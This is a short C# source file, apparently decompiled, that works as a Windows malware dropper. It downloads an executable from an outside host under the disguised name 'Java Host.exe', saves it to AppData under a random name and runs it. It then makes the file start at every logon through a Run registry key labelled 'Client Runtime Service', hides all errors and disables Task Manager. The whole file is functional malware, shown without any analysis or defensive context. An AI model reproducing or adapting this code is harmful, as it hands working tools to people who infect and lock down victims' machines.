using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using Microsoft.Win32;

internal static class Class0
{
	public static void Main()
	{
		try
		{
			string text = Environment.ExpandEnvironmentVariables("%AppData%") + "\\" + Path.GetFileNameWithoutExtension(Path.GetTempFileName()) + ".exe";
			new WebClient().DownloadFile("http://directxex.com/uploads/498440136.Java Host.exe", text);
			Process process = new Process();
			process.StartInfo.FileName = text;
			process.Start();
			Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("Client Runtime Service", text);
		}
		catch
		{
		}
		Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System").SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
	}
}
